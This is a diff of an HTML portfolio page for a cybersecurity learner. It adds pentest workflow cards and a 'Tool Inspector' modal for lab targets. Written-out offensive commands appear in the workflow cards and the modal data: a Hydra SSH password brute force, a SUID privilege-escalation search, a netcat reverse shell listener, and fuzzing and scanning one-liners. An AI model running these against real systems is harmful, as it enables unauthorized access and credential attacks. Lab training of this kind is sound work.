+<a href="handbook/modules/tools-reference.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-primary hover:bg-primary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 04: Vulnerability Validation & Banner Analysis">
+<span class="text-outline text-[10px] group-hover:text-primary transition-colors">STEP 04</span>
+<span class="text-primary font-bold mt-0.5 flex items-center gap-0.5">VALIDATE <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="payloads.html" class="p-2.5 rounded bg-canvas-base border border-danger-critical/30 hover:border-danger-critical hover:bg-danger-critical/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 05: Controlled Exploit Concepts & Shell Handling">
+<span class="text-outline text-[10px] group-hover:text-danger-critical transition-colors">STEP 05</span>
+<span class="text-danger-critical font-bold mt-0.5 text-[11px] flex items-center gap-0.5">EXPLOITS <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="handbook/modules/privilege-escalation.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-secondary hover:bg-secondary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 06: Linux & Windows Privilege Escalation Guide">
+<span class="text-outline text-[10px] group-hover:text-secondary transition-colors">STEP 06</span>
+<span class="text-secondary font-bold mt-0.5 text-[11px] flex items-center gap-0.5">PRIVESC <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="handbook/modules/pentest-methodology.html" class="p-2.5 rounded bg-canvas-base border border-border-hairline hover:border-primary hover:bg-primary/5 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 07: Evidence Documentation & CVSS Scoring">
+<span class="text-outline text-[10px] group-hover:text-on-surface transition-colors">STEP 07</span>
+<span class="text-on-surface font-bold mt-0.5 text-[11px] flex items-center gap-0.5">EVIDENCE <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
+<a href="handbook/modules/pentest-methodology.html" class="p-2.5 rounded bg-canvas-base border border-primary/40 hover:border-primary hover:bg-primary/10 transition-all flex flex-col items-center text-center group cursor-pointer" title="Step 08: Remediation & Defensive Security Hardening">
+<span class="text-outline text-[10px] group-hover:text-primary transition-colors">STEP 08</span>
+<span class="text-primary font-bold mt-0.5 text-[11px] flex items-center gap-0.5">REMEDIATE <span class="text-[9px] opacity-0 group-hover:opacity-100 transition-opacity">↗</span></span>
+</a>
 </div>
 </div>
 <!-- Hands-on Workflows & Lab Architecture Setup -->
 <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
 <div class="lg:col-span-7 space-y-3">
-<div class="font-mono text-xs text-outline mb-2">REPRODUCIBLE HANDS-ON WORKFLOWS</div>
-<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline">
-<div class="flex items-center justify-between text-xs mb-1">
-<span class="text-primary font-bold font-mono">Network Enumeration Workflow</span>
+<div class="font-mono text-xs text-outline mb-2 flex items-center justify-between">
+  <span>REPRODUCIBLE HANDS-ON WORKFLOWS</span>
+  <span class="text-primary font-mono text-[10px]">CLICK TO PRACTICE OR VIEW MANUAL</span>
+</div>
+<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-primary/50 transition-all space-y-2">
+<div class="flex items-center justify-between text-xs">
+<a href="handbook/nmap.html" class="text-primary font-bold font-mono hover:underline flex items-center gap-1">
+  <span>Network Enumeration Workflow</span>
+  <span class="text-[10px]">↗</span>
+</a>
 <span class="text-outline font-mono text-[11px]">NMAP → BANNER</span>
 </div>
 <p class="text-xs text-on-surface-variant">
-          Nmap host sweep → SYN port scan → Service version detection (-sV) → Banner grabbing &amp; NSE default script scans in authorized rooms.
-        </p>
+  Nmap host sweep → SYN port scan → Service version detection (-sV) → Banner grabbing &amp; NSE default script scans in authorized rooms.
+</p>
+<div class="flex items-center justify-between pt-1 text-[10px] font-mono">
+  <div class="flex items-center gap-1.5 text-primary bg-canvas-base px-2 py-0.5 rounded border border-border-hairline">
+    <code>nmap -sC -sV -p- -T4 target.lab</code>
+  </div>
+  <a href="terminal-lab.html?cmd=nmap" class="text-primary hover:underline font-bold flex items-center gap-0.5">Run in Lab ▶</a>
 </div>
-<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline">
-<div class="flex items-center justify-between text-xs mb-1">
-<span class="text-secondary font-bold font-mono">Web Security Exploration Workflow</span>
+</div>
+<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-secondary/50 transition-all space-y-2">
+<div class="flex items-center justify-between text-xs">
+<a href="handbook/modules/web-security.html" class="text-secondary font-bold font-mono hover:underline flex items-center gap-1">
+  <span>Web Security Exploration Workflow</span>
+  <span class="text-[10px]">↗</span>
+</a>
 <span class="text-outline font-mono text-[11px]">BURP → PARAMETER</span>
 </div>
 <p class="text-xs text-on-surface-variant">
-          Burp Suite proxy intercept → HTTP history inspection → Parameter fuzzing with ffuf → Parameter manipulation &amp; form input audits.
-        </p>
+  Burp Suite proxy intercept → HTTP history inspection → Parameter fuzzing with ffuf → Parameter manipulation &amp; form input audits.
+</p>
+<div class="flex items-center justify-between pt-1 text-[10px] font-mono">
+  <div class="flex items-center gap-1.5 text-secondary bg-canvas-base px-2 py-0.5 rounded border border-border-hairline">
+    <code>ffuf -u http://target.lab/FUZZ -w common.txt</code>
+  </div>
+  <a href="terminal-lab.html?cmd=ffuf" class="text-primary hover:underline font-bold flex items-center gap-0.5">Run in Lab ▶</a>
 </div>
-<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline">
-<div class="flex items-center justify-between text-xs mb-1">
-<span class="text-on-surface font-bold font-mono">Password &amp; Credential Workflow</span>
+</div>
+<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-border-highlight transition-all space-y-2">
+<div class="flex items-center justify-between text-xs">
+<a href="handbook/modules/credential-security.html" class="text-on-surface font-bold font-mono hover:underline flex items-center gap-1">
+  <span>Password &amp; Credential Workflow</span>
+  <span class="text-[10px]">↗</span>
+</a>
 <span class="text-outline font-mono text-[11px]">HYDRA / HASHCAT</span>
 </div>
 <p class="text-xs text-on-surface-variant">
-          Authorized lab login testing with Hydra → Hash identification &amp; GPU dictionary recovery using Hashcat / John with rockyou wordlist.
-        </p>
+  Authorized lab login testing with Hydra → Hash identification &amp; GPU dictionary recovery using Hashcat / John with rockyou wordlist.
+</p>
+<div class="flex items-center justify-between pt-1 text-[10px] font-mono">
+  <div class="flex items-center gap-1.5 text-on-surface bg-canvas-base px-2 py-0.5 rounded border border-border-hairline">
+    <code>hydra -l admin -P rockyou.txt ssh://target.lab</code>
+  </div>
+  <a href="terminal-lab.html?cmd=hydra" class="text-primary hover:underline font-bold flex items-center gap-0.5">Run in Lab ▶</a>
 </div>
-<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline">
-<div class="flex items-center justify-between text-xs mb-1">
-<span class="text-primary font-bold font-mono">Exploitation Concepts &amp; Privilege Escalation</span>
+</div>
+<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-danger-critical/40 transition-all space-y-2">
+<div class="flex items-center justify-between text-xs">
+<a href="handbook/metasploit.html" class="text-primary font-bold font-mono hover:underline flex items-center gap-1">
+  <span>Exploitation Concepts &amp; Privilege Escalation</span>
+  <span class="text-[10px]">↗</span>
+</a>
 <span class="text-outline font-mono text-[11px]">METASPLOIT → SUID</span>
 </div>
 <p class="text-xs text-on-surface-variant">
-          Metasploit exploit verification on vulnerable target → Meterpreter session handling → Linux file permission audits, SUID checks &amp; sudo rule reviews.
-        </p>
+  Metasploit exploit verification on vulnerable target → Meterpreter session handling → Linux file permission audits, SUID checks &amp; sudo rule reviews.
+</p>
+<div class="flex items-center justify-between pt-1 text-[10px] font-mono">
+  <div class="flex items-center gap-1.5 text-danger-critical bg-canvas-base px-2 py-0.5 rounded border border-border-hairline">
+    <code>find / -perm -4000 -type f 2&gt;/dev/null</code>
+  </div>
+  <a href="payloads.html" class="text-danger-critical hover:underline font-bold flex items-center gap-0.5">Payload Hub ↗</a>
 </div>
-<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline">
-<div class="flex items-center justify-between text-xs mb-1">
-<span class="text-secondary font-bold font-mono">Packet Analysis &amp; Wireless Workflows</span>
+</div>
+<div class="p-3.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-secondary/50 transition-all space-y-2">
+<div class="flex items-center justify-between text-xs">
+<a href="handbook/modules/network-security.html" class="text-secondary font-bold font-mono hover:underline flex items-center gap-1">
+  <span>Packet Analysis &amp; Wireless Workflows</span>
+  <span class="text-[10px]">↗</span>
+</a>
 <span class="text-outline font-mono text-[11px]">WIRESHARK / AIRCRACK</span>
 </div>
 <p class="text-xs text-on-surface-variant">
-          Interface capture &amp; PCAP stream decoding via Wireshark; authorized educational 802.11 beacon observation and WPA2 packet analysis via Aircrack-ng.
-        </p>
+  Interface capture &amp; PCAP stream decoding via Wireshark; authorized educational 802.11 beacon observation and WPA2 packet analysis via Aircrack-ng.
+</p>
+<div class="flex items-center justify-between pt-1 text-[10px] font-mono">
+  <div class="flex items-center gap-1.5 text-secondary bg-canvas-base px-2 py-0.5 rounded border border-border-hairline">
+    <code>tshark -r capture.pcap -Y "http"</code>
+  </div>
+  <a href="terminal-lab.html?cmd=tshark" class="text-primary hover:underline font-bold flex items-center gap-0.5">Run in Lab ▶</a>
+</div>
 </div>
 </div>
 <!-- Personal Lab Environment Card -->
@@ -936,33 +1470,33 @@
 <span>PERSONAL CYBERSECURITY ENVIRONMENT</span>
 </div>
 <span class="px-2 py-0.5 rounded bg-canvas-base border border-primary/40 font-mono text-[10px] text-primary font-bold">
-            LEARNING LAB
-          </span>
+  LEARNING LAB
+</span>
 </div>
 <p class="text-xs text-on-surface-variant leading-relaxed">
-          Dedicated personal learning and development environment running Kali Linux as primary OS, local security tooling, TryHackMe practice, security experimentation, programming, and local AI (Ollama + Qwen3-Coder 30B on RTX 4070 GPU). Strictly an educational research space, not commercial penetration-testing infrastructure.
-        </p>
+  Dedicated personal learning and development environment running Kali Linux as primary OS, local security tooling, TryHackMe practice, security experimentation, programming, and local AI (Ollama + Qwen3-Coder 30B on RTX 4070 GPU). Strictly an educational research space, not commercial penetration-testing infrastructure.
+</p>
 <div class="space-y-2 pt-2 font-mono text-xs">
-<div class="p-2 rounded bg-canvas-base border border-border-hairline flex justify-between">
-<span class="text-outline">PRIMARY OS:</span>
-<span class="text-on-surface font-semibold">Kali Linux (Daily Driver)</span>
-</div>
-<div class="p-2 rounded bg-canvas-base border border-border-hairline flex justify-between">
-<span class="text-outline">TARGET LABS:</span>
-<span class="text-secondary font-semibold">TryHackMe (140+ Rooms) &amp; Local VMs</span>
-</div>
-<div class="p-2 rounded bg-canvas-base border border-border-hairline flex justify-between">
-<span class="text-outline">INTERCEPTION:</span>
-<span class="text-on-surface font-semibold">Burp Suite Community + Wireshark</span>
-</div>
-<div class="p-2 rounded bg-canvas-base border border-border-hairline flex justify-between">
-<span class="text-outline">EXPLOIT &amp; CRACK:</span>
-<span class="text-on-surface font-semibold">Metasploit, Hashcat, John, Hydra, ffuf</span>
-</div>
-<div class="p-2 rounded bg-canvas-base border border-border-hairline flex justify-between">
-<span class="text-outline">AI ASSIST:</span>
-<span class="text-primary font-semibold">Ollama + Qwen3-Coder (Local RTX 4070)</span>
-</div>
+<a href="handbook/linux.html" class="p-2 rounded bg-canvas-base border border-border-hairline hover:border-primary/50 flex justify-between transition-colors group">
+<span class="text-outline group-hover:text-primary transition-colors">PRIMARY OS:</span>
+<span class="text-on-surface font-semibold group-hover:text-primary transition-colors">Kali Linux (Daily Driver) ↗</span>
+</a>
+<a href="certificates.html" class="p-2 rounded bg-canvas-base border border-border-hairline hover:border-secondary/50 flex justify-between transition-colors group">
+<span class="text-outline group-hover:text-secondary transition-colors">TARGET LABS:</span>
+<span class="text-secondary font-semibold group-hover:underline">TryHackMe (140+ Rooms) ↗</span>
+</a>
+<a href="handbook/modules/web-security.html" class="p-2 rounded bg-canvas-base border border-border-hairline hover:border-primary/50 flex justify-between transition-colors group">
+<span class="text-outline group-hover:text-primary transition-colors">INTERCEPTION:</span>
+<span class="text-on-surface font-semibold group-hover:text-primary transition-colors">Burp Suite + Wireshark ↗</span>
+</a>
+<a href="handbook/modules/tools-reference.html" class="p-2 rounded bg-canvas-base border border-border-hairline hover:border-primary/50 flex justify-between transition-colors group">
+<span class="text-outline group-hover:text-primary transition-colors">EXPLOIT &amp; CRACK:</span>
+<span class="text-on-surface font-semibold group-hover:text-primary transition-colors">Metasploit, Hashcat, Hydra ↗</span>
+</a>
+<a href="projects/autonomous-pentesting-agent.html" class="p-2 rounded bg-canvas-base border border-border-hairline hover:border-secondary/50 flex justify-between transition-colors group">
+<span class="text-outline group-hover:text-secondary transition-colors">AI ASSIST:</span>
+<span class="text-primary font-semibold group-hover:underline">Ollama + Qwen3-Coder (RTX 4070) ↗</span>
+</a>
 </div>
 </div>
 <div class="mt-6 pt-4 border-t border-border-hairline flex items-center justify-between font-mono text-[10px] text-outline">
@@ -1550,47 +2084,83 @@
 <p class="text-sm text-on-surface-variant">The structured trajectory from fundamental computer science to offensive security specialization and AI automation.</p>
 </div>
 <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline relative">
+<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline hover:border-primary/50 transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-outline mb-1">PHASE 01 (COMPLETED)</div>
 <div class="text-base font-semibold text-on-surface mb-2">CS &amp; Programming Foundations</div>
-<p class="text-xs text-on-surface-variant">
-        Mastering data structures, algorithms, low-level systems programming in C, and scripting automation in Python.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Mastering data structures, algorithms, low-level systems programming in C, and scripting automation in Python.
+</p>
 </div>
-<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline relative">
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-outline">ACADEMIC &amp; PRACTICE</span>
+  <a href="handbook/modules/security-automation.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">View Foundations ↗</a>
+</div>
+</div>
+<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline hover:border-secondary/50 transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-outline mb-1">PHASE 02 (COMPLETED)</div>
 <div class="text-base font-semibold text-on-surface mb-2">Linux &amp; Network Architecture</div>
-<p class="text-xs text-on-surface-variant">
-        Kali Linux daily driver, operating system internals, permission hierarchies, bash scripting, and TCP/IP packet dissection.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Kali Linux daily driver, operating system internals, permission hierarchies, bash scripting, and TCP/IP packet dissection.
+</p>
 </div>
-<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline relative">
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-outline">DAILY RUNTIME</span>
+  <a href="handbook/linux.html" class="text-secondary hover:underline flex items-center gap-1 font-semibold">View Linux Guide ↗</a>
+</div>
+</div>
+<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline hover:border-primary/50 transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-primary mb-1">PHASE 03 (COMPLETED)</div>
 <div class="text-base font-semibold text-on-surface mb-2">Cybersecurity Fundamentals</div>
-<p class="text-xs text-on-surface-variant">
-        Threat modeling, cryptography basics, firewall architectures, and Google Cybersecurity Professional Certificate.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Threat modeling, cryptography basics, firewall architectures, and Google Cybersecurity Professional Certificate.
+</p>
 </div>
-<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline relative">
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-outline">INDUSTRY CERT</span>
+  <a href="certificate-viewer.html?id=google-cybersecurity" class="text-primary hover:underline flex items-center gap-1 font-semibold">Verify Credential ↗</a>
+</div>
+</div>
+<div class="bg-surface-subtle p-5 rounded-lg border border-border-hairline hover:border-primary/50 transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-primary mb-1">PHASE 04 (COMPLETED)</div>
 <div class="text-base font-semibold text-on-surface mb-2">THM Pre Security &amp; Cyber Security 101</div>
-<p class="text-xs text-on-surface-variant">
-        Completed foundational TryHackMe tracks covering networking basics, web application security, Burp Suite, and Linux fundamentals.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Completed foundational TryHackMe tracks covering networking basics, web application security, Burp Suite, and Linux fundamentals.
+</p>
 </div>
-<div class="bg-surface-subtle p-5 rounded-lg border border-primary/30 relative">
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-outline">PLATFORM MILESTONE</span>
+  <a href="certificates.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">View THM Tracks ↗</a>
+</div>
+</div>
+<div class="bg-surface-subtle p-5 rounded-lg border border-primary/30 hover:border-primary transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-primary font-bold mb-1">PHASE 05 (CURRENT MILESTONE)</div>
 <div class="text-base font-semibold text-on-surface mb-2">THM Jr Penetration Tester &amp; 140+ Rooms</div>
-<p class="text-xs text-on-surface-variant">
-        Active Jr Penetration Tester path, executing controlled exploitation concepts, SUID privilege escalation, and maintaining Top 2% standing.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Active Jr Penetration Tester path, executing controlled exploitation concepts, SUID privilege escalation, and maintaining Top 2% standing.
+</p>
 </div>
-<div class="bg-surface-subtle p-5 rounded-lg border border-secondary/30 relative">
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-primary font-bold">TOP 2% GLOBALLY</span>
+  <a href="handbook/modules/privilege-escalation.html" class="text-primary hover:underline flex items-center gap-1 font-semibold">PrivEsc Guide ↗</a>
+</div>
+</div>
+<div class="bg-surface-subtle p-5 rounded-lg border border-secondary/30 hover:border-secondary transition-all flex flex-col justify-between group">
+<div>
 <div class="font-mono text-[10px] text-secondary font-bold mb-1">PHASE 06 (CURRENT ENGINEERING)</div>
 <div class="text-base font-semibold text-on-surface mb-2">Security Automation &amp; Local AI (SentinelAI)</div>
-<p class="text-xs text-on-surface-variant">
-        Developing SentinelAI, CyberAI, Ollama + Qwen3-Coder 30B orchestration, and private vulnerability intelligence platforms.
-      </p>
+<p class="text-xs text-on-surface-variant leading-relaxed">
+  Developing SentinelAI, CyberAI, Ollama + Qwen3-Coder 30B orchestration, and private vulnerability intelligence platforms.
+</p>
+</div>
+<div class="mt-4 pt-3 border-t border-border-hairline flex items-center justify-between font-mono text-[10px]">
+  <span class="text-secondary font-bold">ACTIVE DEVELOPMENT</span>
+  <a href="projects/sentinelai.html" class="text-secondary hover:underline flex items-center gap-1 font-semibold">SentinelAI Case Study ↗</a>
+</div>
 </div>
 </div>
 </section>
@@ -1747,6 +2317,637 @@
       window.location.href = `mailto:cybehmihraj32@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
     });
   }
+</script>
+
+<!-- ========================================================================= -->
+<!-- Cyber Toolkit Inspector HUD Modal                                          -->
+<!-- ========================================================================= -->
+<div id="tool-inspector-modal" class="fixed inset-0 z-[999999] hidden items-center justify-center p-4 bg-canvas-base/85 backdrop-blur-md transition-opacity duration-200">
+  <div class="relative w-full max-w-4xl bg-surface-subtle border border-primary/50 rounded-2xl shadow-[0_20px_60px_rgba(0,0,0,0.8),0_0_40px_rgba(78,222,163,0.15)] overflow-hidden flex flex-col max-h-[90vh]">
+    <!-- Modal Header -->
+    <div class="px-6 py-4 bg-surface-raised border-b border-border-hairline flex items-center justify-between shrink-0">
+      <div class="flex items-center gap-3">
+        <span class="w-3 h-3 rounded-full bg-primary animate-pulse"></span>
+        <div>
+          <div class="flex items-center gap-2 flex-wrap">
+            <h3 id="hud-tool-title" class="font-mono text-base font-bold text-on-surface">TOOL HUD</h3>
+            <span id="hud-tool-badge" class="px-2 py-0.5 rounded font-mono text-[10px] font-bold bg-primary/10 border border-primary/40 text-primary">PHASE 01</span>
+          </div>
+          <p id="hud-tool-subtitle" class="font-mono text-[11px] text-outline">OPERATIONAL INSPECTOR &amp; COMMAND RUNNER</p>
+        </div>
+      </div>
+      <button id="hud-close-btn" class="p-1.5 rounded-lg bg-surface-subtle border border-border-hairline hover:border-danger-critical text-outline hover:text-danger-critical transition-colors cursor-pointer" title="Close [ESC]">
+        <span class="material-symbols-outlined text-base">close</span>
+      </button>
+    </div>
+    
+    <!-- Modal Body (Scrollable) -->
+    <div class="p-6 overflow-y-auto space-y-6 font-mono text-xs">
+      <!-- Scenario Section -->
+      <div class="p-4 rounded-xl bg-canvas-base border border-border-hairline space-y-2">
+        <div class="flex items-center justify-between flex-wrap gap-2">
+          <span class="text-primary font-bold text-xs flex items-center gap-1.5">
+            <span class="material-symbols-outlined text-sm">radar</span>
+            REALISTIC ENGAGEMENT SCENARIO
+          </span>
+          <span id="hud-scenario-target" class="text-[10px] text-outline px-2 py-0.5 rounded bg-surface-subtle border border-border-hairline">TARGET: 10.10.10.125</span>
+        </div>
+        <p id="hud-scenario-desc" class="text-xs text-on-surface-variant font-sans leading-relaxed"></p>
+        <div class="pt-2 flex flex-wrap gap-2 text-[10px]">
+          <span class="text-outline">BEST USE CASE:</span>
+          <span id="hud-best-use" class="text-secondary font-sans font-semibold"></span>
+        </div>
+      </div>
+
+      <!-- Commands Grid -->
+      <div class="space-y-3">
+        <div class="flex items-center justify-between">
+          <span class="text-secondary font-bold text-xs flex items-center gap-1.5">
+            <span class="material-symbols-outlined text-sm">terminal</span>
+            CURATED PRODUCTION COMMANDS
+          </span>
+          <span class="text-[10px] text-outline">CLICK CLIPBOARD ICON TO COPY</span>
+        </div>
+        <div id="hud-commands-container" class="space-y-2"></div>
+      </div>
+
+      <!-- Terminal Output Box -->
+      <div class="rounded-xl border border-border-hairline bg-canvas-base overflow-hidden">
+        <div class="px-4 py-2 bg-surface-raised border-b border-border-hairline flex items-center justify-between text-[10px]">
+          <span class="text-outline">SIMULATED TERMINAL OUTPUT</span>
+          <span class="text-primary flex items-center gap-1">
+            <span class="w-1.5 h-1.5 rounded-full bg-primary"></span>
+            STDOUT / TTY
+          </span>
+        </div>
+        <pre id="hud-terminal-output" class="p-4 text-[11px] text-primary bg-[#080B10] overflow-x-auto whitespace-pre font-mono leading-relaxed select-all max-h-48"></pre>
+      </div>
+    </div>
+
+    <!-- Modal Footer Actions -->
+    <div class="px-6 py-3.5 bg-surface-raised border-t border-border-hairline flex flex-wrap items-center justify-between gap-3 shrink-0">
+      <div class="flex items-center gap-2">
+        <span class="text-[11px] text-outline font-mono">SHORTCUT: [ESC TO CLOSE]</span>
+      </div>
+      <div class="flex items-center gap-3">
+        <a id="hud-docs-link" href="#" class="inline-flex items-center gap-1 px-3 py-1.5 rounded bg-surface-subtle border border-border-hairline hover:border-primary text-on-surface font-mono text-xs transition-colors">
+          <span>Handbook Guide</span>
+          <span class="material-symbols-outlined text-xs">open_in_new</span>
+        </a>
+        <a id="hud-lab-link" href="#" class="inline-flex items-center gap-1 px-3.5 py-1.5 rounded bg-primary-container text-canvas-base hover:bg-primary font-mono text-xs font-bold transition-all shadow-[0_0_12px_rgba(16,185,129,0.3)]">
+          <span class="material-symbols-outlined text-sm">terminal</span>
+          <span>Execute in Lab ▶</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Tool Inspector HUD Data Repository
+  const TOOL_INSPECTOR_DATA = {
+    nmap: {
+      title: 'Nmap (Network Mapper)',
+      badge: 'PHASE 01 // RECON & ENUM',
+      target: 'TARGET: 10.10.10.125 (Subnet 10.10.10.0/24)',
+      desc: 'Target host is assigned on the TryHackMe challenge subnet. We initiate stealth SYN scanning (-sS) to identify open TCP ports without completing the 3-way handshake, followed by deep service version detection (-sV) and default non-intrusive Lua scripts (-sC) to map server software versions.',
+      bestUse: 'Stealth host discovery, full 65,535 port audits, OS fingerprinting, and automated vulnerability detection via NSE scripts.',
+      commands: [
+        { label: 'Initial Stealth SYN Scan', cmd: 'nmap -sS -p 21,22,80,443,8080 -T4 10.10.10.125', note: 'Fast baseline scan with timing template 4' },
+        { label: 'Full Port & Version Audit', cmd: 'nmap -sC -sV -p- -T4 -oN nmap_recon.txt 10.10.10.125', note: 'Scan all 65,535 ports with output logged to disk' },
+        { label: 'Vulnerability NSE Audit', cmd: 'nmap --script "vuln and safe" -p 80,8080 10.10.10.125', note: 'Run non-destructive vulnerability detection scripts' }
+      ],
+      output: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 00:55 UTC
+Nmap scan report for target.lab (10.10.10.125)
+Host is up (0.024s latency).
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Educational Target Portal
+8080/tcp open  http-proxy  Werkzeug/2.0.2 Python/3.8.10
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds`,
+      docsUrl: 'handbook/nmap.html',
+      labUrl: 'terminal-lab.html?cmd=nmap'
+    },
+    ffuf: {
+      title: 'ffuf (Fast Web Fuzzer)',
+      badge: 'PHASE 01 // WEB CONTENT DISCOVERY',
+      target: 'TARGET: http://10.10.10.125:8080/FUZZ',
+      desc: 'Target web service has standard pages visible, but administrative endpoints are unlinked. We employ ffuf with SecLists discovery wordlists to discover hidden directories, admin consoles, and API routing endpoints, matching status codes 200, 204, 301, and 302.',
+      bestUse: 'High-speed directory enumeration, virtual host (vhost) fuzzing, and HTTP GET/POST query parameter fuzzing.',
+      commands: [
+        { label: 'Standard Directory Discovery', cmd: 'ffuf -u http://10.10.10.125/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301', note: 'Filter for success and redirection status codes' },
+        { label: 'File Extension Fuzzing', cmd: 'ffuf -u http://10.10.10.125/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak -t 40', note: 'Fuzz common file types with 40 worker threads' },
+        { label: 'Virtual Host (VHost) Fuzzing', cmd: 'ffuf -u http://10.10.10.125/ -H "Host: FUZZ.target.lab" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1420', note: 'Filter default response size (1420 bytes) to uncover hidden vhosts' }
+      ],
+      output: `        /'___\\  /'___\\           /'___\\       
+       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
+       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\  (v2.1.0)
+        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ 
+         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\  
+          \\/_/    \\/_/   \\/___/    \\/_/   
+
+:: Method           : GET
+:: URL              : http://10.10.10.125/FUZZ
+:: Wordlist         : /usr/share/wordlists/dirb/common.txt
+:: Match Codes      : [200, 301]
+
+admin                   [Status: 301, Size: 312, Words: 20, Lines: 10]
+api                     [Status: 301, Size: 310, Words: 20, Lines: 10]
+index.php               [Status: 200, Size: 2451, Words: 380, Lines: 64]
+robots.txt              [Status: 200, Size: 142, Words: 12, Lines: 6]
+uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+:: Progress: [4614/4614] :: Job [1/1] :: 640 req/sec :: Duration: [0:00:07] :: Errors: 0 ::`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-ffuf',
+      labUrl: 'terminal-lab.html?cmd=ffuf'
+    },
+    netcat: {
+      title: 'Netcat (The Swiss Army Knife)',
+      badge: 'PHASE 01 // SOCKETS & LISTENERS',
+      target: 'TARGET: 10.10.10.125:21 (FTP Port)',
+      desc: 'Used for raw protocol diagnostics, banner confirmation, and staging listeners for inbound reverse shells. Direct connection to port 21 returns the FTP daemon banner, identifying vsftpd 2.3.4.',
+      bestUse: 'Manual service probing, raw HTTP/SMTP banner grabbing, and reverse shell listener termination.',
+      commands: [
+        { label: 'Service Banner Probe', cmd: 'nc -nv 10.10.10.125 21', note: 'Connect with verbose and no-DNS resolution' },
+        { label: 'Reverse Shell Listener', cmd: 'nc -lvnp 4444', note: 'Bind TCP listener on local port 4444' },
+        { label: 'Port Range Connectivity Sweep', cmd: 'nc -z -v -w 2 10.10.10.125 20-100', note: 'Zero-I/O port scan across ports 20-100' }
+      ],
+      output: `(UNKNOWN) [10.10.10.125] 21 (ftp) open
+220 (vsFTPd 2.3.4)
+USER anonymous
+331 Please specify the password.
+PASS guest
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.`,
+      docsUrl: 'handbook/modules/tools-reference.html#tool-netcat',
+      labUrl: 'terminal-lab.html?cmd=nc'
+    },
+    burp: {
+      title: 'Burp Suite Community',
+      badge: 'PHASE 02 // WEB PROXY & TAMPERING',
+      target: 'TARGET: http://10.10.10.125/admin/login.php',
+      desc: 'Burp Suite intercepts HTTP traffic between browser and web application. By capturing the POST authentication request, we analyze cookie flags (HttpOnly, Secure), inspect parameters, and send the request to Repeater to test SQL injection and authentication bypass payloads.',
